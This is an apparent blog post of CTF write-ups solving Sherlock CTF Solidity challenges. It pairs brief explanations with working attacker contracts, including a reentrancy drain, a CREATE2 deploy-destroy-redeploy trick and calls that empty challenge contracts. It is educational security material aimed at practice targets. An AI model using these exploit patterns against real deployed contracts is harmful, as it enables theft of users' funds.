<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">7</span><span class="p">.</span><span class="mi">2</span><span class="p">;</span>
<span class="ln"> 2</span>
<span class="ln"> 3</span><span class="kn">import</span> <span class="s">&#34;./BuiltByANoob.sol&#34;</span><span class="p">;</span>
<span class="ln"> 4</span>
<span class="ln"> 5</span><span class="kd">contract</span> <span class="nc">naps62Attacker</span> <span class="p">{</span>
<span class="ln"> 6</span>
<span class="ln"> 7</span>    <span class="kt">uint8</span><span class="p">[]</span> <span class="n">values</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x0e</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">];</span>
<span class="ln"> 8</span>   
<span class="ln"> 9</span>    <span class="kd">constructor</span><span class="p">(</span><span class="n">BuiltByANoob</span> <span class="n">instance</span><span class="p">)</span> <span class="k">payable</span> <span class="p">{</span>
<span class="ln">10</span>        
<span class="ln">11</span>        <span class="n">instance</span><span class="p">.</span><span class="n">write0</span><span class="p">();</span>        
<span class="ln">12</span>
<span class="ln">13</span>        <span class="k">for</span><span class="p">(</span><span class="kt">uint</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">values</span><span class="p">.</span><span class="n">length</span><span class="o">/</span><span class="mi">2</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
<span class="ln">14</span>            <span class="kt">bytes1</span> <span class="n">n1</span> <span class="o">=</span> <span class="kt">bytes1</span><span class="p">(</span><span class="n">values</span><span class="p">[</span><span class="mi">2</span><span class="o">*</span><span class="n">i</span><span class="p">]);</span>
<span class="ln">15</span>            <span class="kt">bytes1</span> <span class="n">n2</span> <span class="o">=</span> <span class="kt">bytes1</span><span class="p">(</span><span class="n">values</span><span class="p">[</span><span class="mi">2</span><span class="o">*</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]);</span>
<span class="ln">16</span>
<span class="ln">17</span>            <span class="n">instance</span><span class="p">.</span><span class="n">write0</span><span class="p">();</span>
<span class="ln">18</span>            <span class="n">instance</span><span class="p">.</span><span class="n">setHalfByte</span><span class="p">(</span><span class="n">n1</span><span class="p">);</span>
<span class="ln">19</span>            <span class="n">instance</span><span class="p">.</span><span class="n">shiftLeft</span><span class="p">(</span><span class="mi">4</span><span class="p">);</span>
<span class="ln">20</span>            <span class="n">instance</span><span class="p">.</span><span class="n">setHalfByte</span><span class="p">(</span><span class="n">n2</span><span class="p">);</span>
<span class="ln">21</span>        <span class="p">}</span>
<span class="ln">22</span>    <span class="p">}</span>
<span class="ln">23</span>    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span> <span class="p">}</span>
<span class="ln">24</span><span class="p">}</span>
</code></pre></div><h3 id="saianmk---combination">saianmk - Combination</h3>
<ul>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/saianmk/Combination.sol">Contract</a></li>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/saianmk/Setup.sol">Setup</a></li>
</ul>
<p>I solved this challenge using a pen and a paper, backtracking from <code>cam3Val</code> back to <code>cam1Val</code> what values should be dialed in to obtain the desired ones. No on-chain solution here, sorry!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">4</span><span class="p">;</span>
<span class="ln"> 2</span>
<span class="ln"> 3</span><span class="kn">import</span> <span class="s">&#34;./Combination.sol&#34;</span><span class="p">;</span>
<span class="ln"> 4</span>
<span class="ln"> 5</span><span class="kd">contract</span> <span class="nc">saianmkAttacker</span> <span class="p">{</span>
<span class="ln"> 6</span>    
<span class="ln"> 7</span>    <span class="kd">constructor</span><span class="p">(</span><span class="n">Combination</span> <span class="n">instance</span><span class="p">)</span> <span class="k">payable</span> <span class="p">{</span>
<span class="ln"> 8</span>        <span class="n">instance</span><span class="p">.</span><span class="n">dial</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
<span class="ln"> 9</span>        <span class="n">instance</span><span class="p">.</span><span class="n">dial</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
<span class="ln">10</span>        <span class="n">instance</span><span class="p">.</span><span class="n">dial</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
<span class="ln">11</span>        <span class="n">instance</span><span class="p">.</span><span class="n">unlock</span><span class="p">(</span><span class="mh">0x4b</span><span class="p">);</span>
<span class="ln">12</span>    <span class="p">}</span>
<span class="ln">13</span>
<span class="ln">14</span>    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span> <span class="p">}</span>
<span class="ln">15</span>
<span class="ln">16</span><span class="p">}</span>
</code></pre></div><h3 id="sidduhere---examplequizexploit-default-name-for-the-template">sidduHERE - ExampleQuizExploit (default name for the template)</h3>
<ul>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/sidduHERE/ExampleQuizExploit.sol">Contract</a></li>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/sidduHERE/Setup.sol">Setup</a></li>
</ul>
<p>This contract has a textbook reentrancy vulnerability, so the solution is a textbook reentrancy exploit :)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">4</span><span class="p">;</span>
<span class="ln"> 2</span>
<span class="ln"> 3</span><span class="kn">import</span> <span class="s">&#34;./ExampleQuizExploit.sol&#34;</span><span class="p">;</span>
<span class="ln"> 4</span>
<span class="ln"> 5</span><span class="kd">contract</span> <span class="nc">sidduHEREAttacker</span> <span class="p">{</span>
<span class="ln"> 6</span>    
<span class="ln"> 7</span>    <span class="kd">function</span> <span class="nf">attack</span><span class="p">(</span><span class="n">ExampleQuizExploit</span> <span class="n">instance</span><span class="p">)</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{</span>
<span class="ln"> 8</span>        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">&gt;=</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">);</span>
<span class="ln"> 9</span>        <span class="n">instance</span><span class="p">.</span><span class="n">deposit</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">}();</span>
<span class="ln">10</span>        <span class="n">instance</span><span class="p">.</span><span class="n">withdraw</span><span class="p">();</span>
<span class="ln">11</span>    <span class="p">}</span>
<span class="ln">12</span>
<span class="ln">13</span>    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span> 
<span class="ln">14</span>        <span class="k">if</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">.</span><span class="nb">balance</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
<span class="ln">15</span>            <span class="n">ExampleQuizExploit</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">).</span><span class="n">withdraw</span><span class="p">();</span>
<span class="ln">16</span>        <span class="p">}</span>
<span class="ln">17</span>    <span class="p">}</span>
<span class="ln">18</span><span class="p">}</span>
</code></pre></div><h3 id="smbsp---collectreward">smbsp - CollectReward</h3>
<ul>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/smbsp/CollectReward.sol">Contract</a></li>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/smbsp/Setup.sol">Setup</a></li>
</ul>
<p>As stated on the first comment of the contract, the goal is to find the correct <code>_startTime</code> to get a reward. That means, to solve the level.</p>
<p>To solve this level, I had to go and check Etherscan for the <code>programStartTime</code> and <code>deploymentBlock</code> variables. Once the values were known, using Remix I printed out the correct value for the reward in <code>_computeReward(uint256,uint256)</code> to be greater than zero.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">4</span><span class="p">;</span>
<span class="ln"> 2</span>
<span class="ln"> 3</span><span class="kn">import</span> <span class="s">&#34;./Setup.sol&#34;</span><span class="p">;</span>
<span class="ln"> 4</span>
<span class="ln"> 5</span><span class="kd">contract</span> <span class="nc">smbspAttacker</span> <span class="p">{</span>
<span class="ln"> 6</span>    
<span class="ln"> 7</span>    <span class="kd">constructor</span><span class="p">(</span><span class="n">CollectReward</span> <span class="n">instance</span><span class="p">)</span> <span class="k">payable</span> <span class="p">{</span>
<span class="ln"> 8</span>        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">==</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">);</span>
<span class="ln"> 9</span>        <span class="n">instance</span><span class="p">.</span><span class="n">collect</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">}(</span><span class="mi">1645230775</span><span class="p">);</span>
<span class="ln">10</span>    <span class="p">}</span>
<span class="ln">11</span>
<span class="ln">12</span>    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span> 
<span class="ln">13</span>    <span class="p">}</span>
<span class="ln">14</span><span class="p">}</span>
</code></pre></div><h3 id="t-nero---monopoly">t-nero - Monopoly</h3>
<ul>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/t-nero/Monopoly.sol">Contract</a></li>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/t-nero/Setup.sol">Setup</a></li>
</ul>
<p>This Monopoly implementation, much like the original game, makes the player throw two dice, and depending on the value obtained, different results can be achieved. The most important difference between the board game and this blockchain implementation, is that the dice here have 65536 sides. In real life, we would call that a sphere. And also, the values from the dice are inputs to the game.</p>
<p>The goal was to empty the instance, so the attacker has to find the correct path of execution, depending on the dice values, that allows the withdrawal. I chose to go for the so-called <em>penalty slot</em>, and return the <code>msg.value/2</code> sent, so that the <code>endTurn(balance)</code> call in <code>play(uint32, uint32)</code> wouldn't revert.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">7</span><span class="p">;</span>
<span class="ln"> 2</span>
<span class="ln"> 3</span><span class="kn">import</span> <span class="s">&#34;./Setup.sol&#34;</span><span class="p">;</span>
<span class="ln"> 4</span>
<span class="ln"> 5</span><span class="kd">contract</span> <span class="nc">tneroAttacker</span> <span class="p">{</span>
<span class="ln"> 6</span>
<span class="ln"> 7</span>    <span class="n">Monopoly</span> <span class="n">instance</span><span class="p">;</span>
<span class="ln"> 8</span>
<span class="ln"> 9</span>    <span class="kd">function</span> <span class="nf">getSeeds</span><span class="p">()</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint16</span> <span class="n">s1</span><span class="p">,</span> <span class="kt">uint16</span> <span class="n">s2</span><span class="p">)</span> <span class="p">{</span>
<span class="ln">10</span>        <span class="n">s1</span> <span class="o">=</span> <span class="kt">uint16</span><span class="p">(</span><span class="mi">151</span><span class="p">)</span> <span class="o">^</span> <span class="kt">uint16</span><span class="p">(</span><span class="kt">bytes2</span><span class="p">(</span><span class="kt">bytes20</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">tx</span><span class="p">.</span><span class="nb">origin</span><span class="p">))));</span>
<span class="ln">11</span>        <span class="n">s2</span> <span class="o">=</span> <span class="kt">uint16</span><span class="p">(</span><span class="mi">331</span><span class="p">)</span> <span class="o">^</span> <span class="kt">uint16</span><span class="p">(</span><span class="kt">bytes2</span><span class="p">(</span><span class="kt">bytes20</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">tx</span><span class="p">.</span><span class="nb">origin</span><span class="p">))));</span>
<span class="ln">12</span>    <span class="p">}</span>
<span class="ln">13</span>
<span class="ln">14</span>     <span class="kd">function</span> <span class="nf">attack</span><span class="p">(</span><span class="n">Monopoly</span> <span class="n">inst</span><span class="p">)</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{</span>
<span class="ln">15</span>        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">.</span><span class="mi">25</span> <span class="kc">ether</span><span class="p">);</span>
<span class="ln">16</span>        <span class="n">instance</span> <span class="o">=</span> <span class="n">inst</span><span class="p">;</span>
<span class="ln">17</span>        <span class="p">(</span><span class="kt">uint16</span> <span class="n">s1</span><span class="p">,</span> <span class="kt">uint16</span> <span class="n">s2</span><span class="p">)</span> <span class="o">=</span> <span class="n">getSeeds</span><span class="p">();</span>
<span class="ln">18</span>        <span class="n">instance</span><span class="p">.</span><span class="n">play</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">}(</span><span class="n">s1</span><span class="p">,</span> <span class="n">s2</span><span class="p">);</span>
<span class="ln">19</span>    <span class="p">}</span>
<span class="ln">20</span>
<span class="ln">21</span>    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
<span class="ln">22</span>        <span class="k">if</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">&lt;</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">)</span> <span class="p">{</span>
<span class="ln">23</span>            <span class="k">payable</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">instance</span><span class="p">)).</span><span class="nb">call</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">}(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
<span class="ln">24</span>        <span class="p">}</span>
<span class="ln">25</span>    <span class="p">}</span>
<span class="ln">26</span><span class="p">}</span>
</code></pre></div><h3 id="teryanarmen---challenge2">teryanarmen - Challenge2</h3>
<ul>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/teryanarmen/Challenge2.sol">Contract</a></li>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/teryanarmen/Setup.sol">Setup</a></li>
</ul>
<p>One of the challenges that fried my brain the most. Also, on the educational side, I learned stuff about <code>CREATE2</code> that I didn't know.</p>
<p>The goal was to call <code>fourth()</code> to empty the contract. That was easier to say than to do. <code>third()</code> required not to be called from a contract (or to be called from a contract constructor) to set <code>winner</code> as the caller, then <code>second()</code> required to be called from a contract. If the caller's <code>sup()</code> method returned 1337, the attacker can call <code>first()</code>. This function requires to be called from an EOA or from a contract's constructor. Also, to make it more interesting, <code>msg.sender</code> has to be the <code>winner</code> set in <code>third()</code>.</p>
<p>This made me think for a few days until it clicked. <code>CREATE2</code> deployment address depends only on the code to be deployed, the caller address, and a seed value. That means you can deploy a contract, destroy it, and redeploy it back to the same address. Understanding that was a major milestone. Then the solution came easy.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">7</span><span class="p">.</span><span class="mi">6</span><span class="p">;</span>
<span class="ln"> 2</span>
<span class="ln"> 3</span><span class="kn">import</span> <span class="s">&#34;./Setup.sol&#34;</span><span class="p">;</span>
<span class="ln"> 4</span><span class="kn">import</span> <span class="s">&#34;hardhat/console.sol&#34;</span><span class="p">;</span>
<span class="ln"> 5</span>
<span class="ln"> 6</span><span class="kd">contract</span> <span class="nc">solver</span> <span class="k">is</span> <span class="n">ICalled</span><span class="p">{</span>
<span class="ln"> 7</span>
<span class="ln"> 8</span>    <span class="n">Challenge2</span> <span class="n">instance</span><span class="p">;</span>
<span class="ln"> 9</span>
<span class="ln">10</span>    <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">inst</span><span class="p">)</span> <span class="k">payable</span> <span class="p">{</span>
<span class="ln">11</span>        <span class="n">instance</span> <span class="o">=</span> <span class="n">Challenge2</span><span class="p">(</span><span class="n">inst</span><span class="p">);</span>
<span class="ln">12</span>        <span class="k">if</span><span class="p">(</span><span class="n">instance</span><span class="p">.</span><span class="n">state</span><span class="p">()</span> <span class="o">==</span> <span class="n">Challenge2</span><span class="p">.</span><span class="n">State</span><span class="p">.</span><span class="n">THREE</span><span class="p">)</span> <span class="p">{</span>
<span class="ln">13</span>            <span class="n">instance</span><span class="p">.</span><span class="n">third</span><span class="p">();</span>
<span class="ln">14</span>        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<span class="ln">15</span>            <span class="n">instance</span><span class="p">.</span><span class="n">first</span><span class="p">();</span>
<span class="ln">16</span>        <span class="p">}</span>  
<span class="ln">17</span>    <span class="p">}</span>
<span class="ln">18</span>
<span class="ln">19</span>    <span class="kd">function</span> <span class="nf">sup</span><span class="p">()</span> <span class="k">external</span> <span class="k">override</span> <span class="k">returns</span><span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
<span class="ln">20</span>        <span class="k">if</span><span class="p">(</span><span class="n">instance</span><span class="p">.</span><span class="n">state</span><span class="p">()</span> <span class="o">==</span> <span class="n">Challenge2</span><span class="p">.</span><span class="n">State</span><span class="p">.</span><span class="n">ZERO</span><span class="p">)</span> <span class="p">{</span>
<span class="ln">21</span>            <span class="k">return</span> <span class="mi">80085</span><span class="p">;</span>
<span class="ln">22</span>        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<span class="ln">23</span>            <span class="k">return</span> <span class="mi">1337</span><span class="p">;</span>
<span class="ln">24</span>        <span class="p">}</span>
<span class="ln">25</span>    <span class="p">}</span>
<span class="ln">26</span>
<span class="ln">27</span>    <span class="kd">function</span> <span class="nf">callSecond</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
<span class="ln">28</span>        <span class="n">instance</span><span class="p">.</span><span class="n">second</span><span class="p">();</span>
<span class="ln">29</span>        <span class="nb">selfdestruct</span><span class="p">(</span><span class="k">payable</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">)));</span>
<span class="ln">30</span>    <span class="p">}</span>
<span class="ln">31</span>
<span class="ln">32</span>    <span class="kd">function</span> <span class="nf">callFourth</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
<span class="ln">33</span>        <span class="n">instance</span><span class="p">.</span><span class="n">fourth</span><span class="p">();</span>
<span class="ln">34</span>    <span class="p">}</span>
<span class="ln">35</span>
<span class="ln">36</span>    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span> <span class="p">}</span>
<span class="ln">37</span>
<span class="ln">38</span><span class="p">}</span>
<span class="ln">39</span>
<span class="ln">40</span><span class="kd">contract</span> <span class="nc">teryanarmenAttacker</span> <span class="p">{</span>
<span class="ln">41</span>
<span class="ln">42</span>    <span class="n">Challenge2</span> <span class="k">public</span> <span class="n">instance</span><span class="p">;</span>
<span class="ln">43</span>    <span class="kt">address</span> <span class="k">public</span> <span class="n">deployed</span><span class="p">;</span>
<span class="ln">44</span>    
<span class="ln">45</span>    <span class="kd">constructor</span><span class="p">(</span><span class="n">Challenge2</span> <span class="n">inst</span><span class="p">)</span> <span class="k">payable</span> <span class="p">{</span>
<span class="ln">46</span>        <span class="n">instance</span> <span class="o">=</span> <span class="n">inst</span><span class="p">;</span>
<span class="ln">47</span>        <span class="n">deploy</span><span class="p">();</span>
<span class="ln">48</span>        <span class="n">solver</span><span class="p">(</span><span class="k">payable</span><span class="p">(</span><span class="n">deployed</span><span class="p">)).</span><span class="n">callSecond</span><span class="p">();</span>
<span class="ln">49</span>    <span class="p">}</span>
<span class="ln">50</span>
<span class="ln">51</span>    <span class="kd">function</span> <span class="nf">solve</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
<span class="ln">52</span>        <span class="n">deploy</span><span class="p">();</span>
<span class="ln">53</span>        <span class="n">solver</span><span class="p">(</span><span class="k">payable</span><span class="p">(</span><span class="n">deployed</span><span class="p">)).</span><span class="n">callFourth</span><span class="p">();</span>
<span class="ln">54</span>    <span class="p">}</span>
<span class="ln">55</span>
<span class="ln">56</span>    <span class="kd">function</span> <span class="nf">deploy</span><span class="p">()</span> <span class="k">internal</span> <span class="p">{</span>
<span class="ln">57</span>         
<span class="ln">58</span>        <span class="kt">bytes</span> <span class="k">memory</span> <span class="nb">code</span> <span class="o">=</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="nb">type</span><span class="p">(</span><span class="nc">solver</span><span class="p">).</span><span class="nb">creationCode</span><span class="p">,</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">encode</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">instance</span><span class="p">)));</span>
<span class="ln">59</span>        <span class="kt">uint256</span> <span class="n">salt</span> <span class="o">=</span> <span class="mh">0x7075</span><span class="p">;</span>
<span class="ln">60</span>        <span class="kt">address</span> <span class="n">addr</span><span class="p">;</span>
<span class="ln">61</span>    
<span class="ln">62</span>        <span class="k">assembly</span> <span class="p">{</span>
<span class="ln">63</span>            <span class="n">addr</span> <span class="o">:=</span> <span class="n">create2</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">add</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">),</span> <span class="nf">mload</span><span class="p">(</span><span class="n">code</span><span class="p">),</span> <span class="n">salt</span><span class="p">)</span>
<span class="ln">64</span>            <span class="n">if</span> <span class="nf">iszero</span><span class="p">(</span><span class="nf">extcodesize</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span> <span class="p">{</span> <span class="nf">revert</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="p">}</span>
<span class="ln">65</span>        <span class="p">}</span>
<span class="ln">66</span>
<span class="ln">67</span>        <span class="n">deployed</span> <span class="err">=</span> <span class="n">addr</span><span class="err">;</span>
<span class="ln">68</span>    <span class="p">}</span>
<span class="ln">69</span>
<span class="ln">70</span>    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span> <span class="p">}</span>
<span class="ln">71</span>
<span class="ln">72</span><span class="p">}</span>
</code></pre></div><h3 id="ych18---funnychallenges">ych18 - FunnyChallenges</h3>
<ul>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/ych18/FunnyChallenges.sol">Contract</a></li>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/ych18/Setup.sol">Setup</a></li>
</ul>
<p>The goal was, again, to empty the ether from the instance. For that, the attacker has to solve two challenges. The first one requires that the arguments to <code>DontGiveUp(string,string)</code> meet some conditions and ultimately their concatenation equals &quot;Sherlock CTF &quot; (note that space at the end).</p>
<p>Once the first part was solved, the next part required to call the <code>transfer(address,uint)</code> function from the instance's address. The helper <code>func(address,uint256,bytes4)</code> function came in handy.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">4</span><span class="p">;</span>
<span class="ln"> 2</span>
<span class="ln"> 3</span><span class="kn">import</span> <span class="s">&#34;./FunnyChallenges.sol&#34;</span><span class="p">;</span>
<span class="ln"> 4</span>
<span class="ln"> 5</span><span class="kd">contract</span> <span class="nc">ych18Attacker</span> <span class="p">{</span>
<span class="ln"> 6</span>
<span class="ln"> 7</span>    <span class="n">FunnyChallenges</span> <span class="n">instance</span><span class="p">;</span>
<span class="ln"> 8</span>    
<span class="ln"> 9</span>    <span class="kd">constructor</span><span class="p">(</span><span class="n">FunnyChallenges</span> <span class="n">inst</span><span class="p">)</span> <span class="k">payable</span> <span class="p">{</span>
<span class="ln">10</span>        <span class="n">instance</span> <span class="o">=</span> <span class="n">inst</span><span class="p">;</span>
<span class="ln">11</span>        <span class="n">instance</span><span class="p">.</span><span class="n">DontGiveUp</span><span class="p">(</span><span class="s">&#34;SherlockCTF&#34;</span><span class="p">,</span> <span class="s">&#34; &#34;</span><span class="p">);</span>
<span class="ln">12</span>    <span class="p">}</span>
<span class="ln">13</span>
<span class="ln">14</span>    <span class="kd">function</span> <span class="nf">attack</span><span class="p">()</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{</span>
<span class="ln">15</span>        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">==</span> <span class="mi">2</span> <span class="kc">ether</span><span class="p">);</span>
<span class="ln">16</span>        <span class="n">instance</span><span class="p">.</span><span class="n">func</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">}(</span><span class="kt">address</span><span class="p">(</span><span class="n">instance</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="s">hex&#34;a9059cbb&#34;</span><span class="p">);</span>
<span class="ln">17</span>    <span class="p">}</span>
<span class="ln">18</span>
<span class="ln">19</span>    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span> <span class="p">}</span>
<span class="ln">20</span><span class="p">}</span>
</code></pre></div>
    </div>

	<h2 class="post_related">Posts in this Series</h2>
	<ul>
	  
	</ul>

<div class="post_comments">
  <div id="disqus_thread"></div>
<script type="application/javascript">
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "tqts" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
  
</div>



  </article>
<aside class="sidebar">
  <section class="sidebar_inner">
        <h2>tqts</h2>
      <div class="author_bio">
        Engineer, maker, hobbyist.
      </div>
      <a href='https://tqts.ar/about/' class="button mt-1" role="button" title='Read More'>Read More</a>
    
      
	    <h2 class="mt-4">Posts in this series</h2>
      <ul>
        
      </ul>
    
    <h2 class="mt-4">Recent Posts</h2>
    <ul class="flex-column">
      <li>
        <a href="https://tqts.ar/post/damnvulnerabledefi-1/" class="nav-link" title="Solving DamnVulnerableDeFi - Part 1 - Levels 1 to 4">Solving DamnVulnerableDeFi - Part 1 - Levels 1 to 4</a>
      </li>
      <li>
        <a href="https://tqts.ar/post/ethernaut-5/" class="nav-link" title="Solving Ethernaut - Part 5 - Levels 21 to 25">Solving Ethernaut - Part 5 - Levels 21 to 25</a>
      </li>
      <li>
        <a href="https://tqts.ar/post/ethernaut-4/" class="nav-link" title="Solving Ethernaut - Part 4 - Levels 16 to 20">Solving Ethernaut - Part 4 - Levels 16 to 20</a>
      </li>
      <li>
        <a href="https://tqts.ar/post/ethernaut-3/" class="nav-link" title="Solving Ethernaut - Part 3 - Levels 11 to 15">Solving Ethernaut - Part 3 - Levels 11 to 15</a>
      </li>
      <li>
        <a href="https://tqts.ar/post/ethernaut-2/" class="nav-link" title="Solving Ethernaut - Part 2 - Levels 6 to 10">Solving Ethernaut - Part 2 - Levels 6 to 10</a>
      </li>
      <li>
        <a href="https://tqts.ar/post/ethernaut-1/" class="nav-link" title="Solving Ethernaut - Part 1 - Levels 0 to 5">Solving Ethernaut - Part 1 - Levels 0 to 5</a>
      </li>
      <li>
        <a href="https://tqts.ar/post/capturetheether-5/" class="nav-link" title="Solving CaptureTheEther - Part 5 of 5 - Miscellaneous">Solving CaptureTheEther - Part 5 of 5 - Miscellaneous</a>
      </li>
      <li>
        <a href="https://tqts.ar/post/capturetheether-4/" class="nav-link" title="Solving CaptureTheEther - Part 4 of 5 - Accounts">Solving CaptureTheEther - Part 4 of 5 - Accounts</a>
      </li>
    </ul>
    <div>
      <h2 class="mt-4 taxonomy" id="categories-section">Categories</h2>
      <nav class="tags_nav">
        <a href='https://tqts.ar/categories/ctf-writeups/' class="post_tag button button_translucent" title="ctf-writeups">
          CTF-WRITEUPS
          <span class="button_tally">12</span>
        </a>
        
        
      </nav>
    </div>
    <div>
      <h2 class="mt-4 taxonomy" id="series-section">Series</h2>
